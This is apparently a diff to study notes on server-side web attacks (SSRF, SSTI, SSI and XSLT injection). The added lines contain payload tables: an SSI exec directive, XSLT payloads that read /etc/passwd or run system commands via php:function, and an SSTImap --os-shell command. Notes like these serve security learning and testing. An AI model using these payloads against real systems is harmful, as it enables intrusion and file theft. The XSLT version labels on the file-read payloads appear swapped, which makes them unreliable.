@@ -1,6 +1,6 @@
 # Server-Side Attacks
 
-## SSRF
+## Server Side Request Forgery (SSRF)
 
 [OWASP SSRF Page](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
 
@@ -72,7 +72,7 @@ We can use [Gopherus](https://github.com/tarunkant/Gopherus) to craft these payl
 - Local port scan may work by comparing error messages, but error message may be the same for closed ports/other services that are open.
 - LFI attempts may show different error messages for files that exist versus files that don't.
 
-## SSTI
+## Server Side Template Injection (SSTI)
 
 ### Tepmlate engines
 
@@ -127,18 +127,46 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 ```
 
 
-## SSI Injection - Directives
+## Server Side Includes (SSI) Injection - Directives
+
+- Typical SSI file extensions include .shtml, .shtm, and .stm (can be configured for arbitrary file extensions).
+- SSI utilizes directives to add dynamically generated content to a static HTML page.
+- Occurs when an attacker can inject SSI directives into a file (usually in the web root directory) that is subsequently served by the web server.
 
 | Directive | Description |
 |-----------|-------------|
-| `<!--#printenv -->` | Print variables |
-| `<!--#config errmsg="Error!" -->` | Change config |
-| `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` | Print specific variable |
+| `<!--#name param1="value1" param2="value" -->` | Directive format |
+| `<!--#printenv -->` | Print the environment variables |
+| `<!--#config errmsg="Error!" -->` | Change config (the error message in this example) |
+| `<!--#echo var="DOCUMENT_NAME" var="DOCUMENT_URI" var="LAST_MODIFIED" var="DATE_LOCAL" -->` | Print specific variable |
 | `<!--#exec cmd="whoami" -->` | Execute command |
-| `<!--#include virtual="index.html" -->` | Include web file |
+| `<!--#include virtual="index.html" -->` | Include web file (only allows files in the web root directory) |
 
-## XSLT Injection
+## eXtensible Stylesheet Language Transformation (XSLT) Injection
+
+- [Documentation](https://www.w3.org/TR/xslt-30/)
+- XSLT can be used to define a data format which is subsequently enriched with data from the XML document.
+- Similar structure to XML.
+- It contains XSL elements within nodes prefixed with the xsl-prefix
+- Example:
+
+```xslt
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+	<xsl:template match="/fruits">
+		Here are all fruits of medium size ordered by their color:
+		<xsl:for-each select="fruit">
+			<xsl:sort select="color" order="descending" />
+			<xsl:if test="size = 'Medium'">
+				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
+			</xsl:if>
+		</xsl:for-each>
+	</xsl:template>
+</xsl:stylesheet>
+```
+
 ### Elements
+
 | Element | Description |
 |---------|-------------|
 | `<xsl:template>` | Indicates an XSL template. Can contain a match attribute that contains a path in the XML-document that the template applies to |
@@ -148,22 +176,30 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 | `<xsl:if>` | Used to test for conditions on a node. The condition is specified in the test argument |
 
 ### Injection Payloads
+
+- `<` Test payload to see if an error message is returned.
+
 #### Information Disclosure
+
 | Payload | Description |
 |---------|-------------|
-| `<xsl:value-of select="system-property('xsl:version')" />` | |
-| `<xsl:value-of select="system-property('xsl:vendor')" />` | |
-| `<xsl:value-of select="system-property('xsl:vendor-url')" />` | |
-| `<xsl:value-of select="system-property('xsl:product-name')" />` | |
-| `<xsl:value-of select="system-property('xsl:product-version')" />` | |
+| `<xsl:value-of select="system-property('xsl:version')" />` | Version |
+| `<xsl:value-of select="system-property('xsl:vendor')" />` | Vendor |
+| `<xsl:value-of select="system-property('xsl:vendor-url')" />` | Vendor URL |
+| `<xsl:value-of select="system-property('xsl:product-name')" />` | Product name |
+| `<xsl:value-of select="system-property('xsl:product-version')" />` | Product Version |
+
+**Tip:** Pass all the above payloads in one go separated by `<br/>` for formatting.
 
 #### LFI
+
 | Payload | Description |
 |---------|-------------|
-| `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />` | |
-| `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />` | |
+| `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />` | LFI for XSLT v1.0 |
+| `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />` | LFI for XSLT v2.0 |
 
 #### RCE
+
 | Payload | Description |
 |---------|-------------|
-| `<xsl:value-of select="php:function('system','id')" />` | |
+| `<xsl:value-of select="php:function('system','id')" />` | RCE if the XSLT processor supports PHP functions |
